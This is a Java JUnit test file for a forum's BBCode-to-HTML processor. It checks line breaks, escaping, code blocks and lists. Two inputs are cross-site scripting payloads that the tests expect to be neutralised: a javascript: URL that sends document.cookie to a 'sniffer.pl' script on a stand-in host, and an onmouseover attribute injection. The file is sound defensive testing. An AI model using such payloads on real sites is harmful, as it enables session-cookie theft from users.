/*
 * Copyright 1998-2009 Linux.org.ru
 *    Licensed under the Apache License, Version 2.0 (the "License");
 *    you may not use this file except in compliance with the License.
 *    You may obtain a copy of the License at
 *
 *        http://www.apache.org/licenses/LICENSE-2.0
 *
 *    Unless required by applicable law or agreed to in writing, software
 *    distributed under the License is distributed on an "AS IS" BASIS,
 *    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *    See the License for the specific language governing permissions and
 *    limitations under the License.
 */

package org.javabb.bbcode;

import java.sql.SQLException;

import static org.junit.Assert.assertEquals;
import org.junit.Test;

import ru.org.linux.util.BadURLException;

public class BBCodeTest {
  private static final String LINE_BREAK_TEST = "test\ntest\n\ntest";
  private static final String LINE_BREAK_RESULT = "<p>test\ntest<p>test";
  
  private static final String TAG_ESCAPE_TEST = "<br>";
  private static final String TAG_ESCAPE_RESULT = "<p>&lt;br&gt;";

  private static final String JAVASCRIPT_URL = "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]";

  private static final String LIST_TEST="[list][*]1[*]2[/list]";
  private static final String LIST_RESULT="<p><ul><li>1<li>2</ul>";

  private static final String BADLIST_TEST="[list]0[*]1[*]2[/list]";
  private static final String BADLIST_RESULT="<p><ul><li>1<li>2</ul>";

  private static final String XSS_URL="[url]http://ex.com/[i]<h1>'onmouseover='alert(document.cookie);'\"</h1>[/i][/url]";


  @Test
  public void testLineBreak() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, LINE_BREAK_TEST);

    assertEquals(LINE_BREAK_RESULT, result);
  }

  @Test
  public void testTagExcape() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, TAG_ESCAPE_TEST);

    assertEquals(TAG_ESCAPE_RESULT, result);
  }

  @Test
  public void testJavascriptURL() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, JAVASCRIPT_URL);

    assertEquals("<p><s>javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s>", result);
  }

  @Test
  public void testCodeExcape() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, "[code]\"code&code\"[/code]");

    assertEquals("<p><pre class=code><p>&quot;code&amp;code&quot;</pre>", result);
  }

  @Test
  public void testList() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, LIST_TEST);

    assertEquals(LIST_RESULT, result);
  }

  @Test
  public void testBadList() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();

    String result = proc.preparePostText(null, BADLIST_TEST);

    assertEquals(BADLIST_RESULT, result);
  }

  @Test
  public void testUnexceptedCut() throws BadURLException, SQLException {
    BBCodeProcessor proc = new BBCodeProcessor();
    proc.setIncludeCut(true);
    String result = proc.preparePostText(null, "[list][*][cut][/cut][/list]");

    assertEquals("<p><ul><li></ul>", result);
  }

}
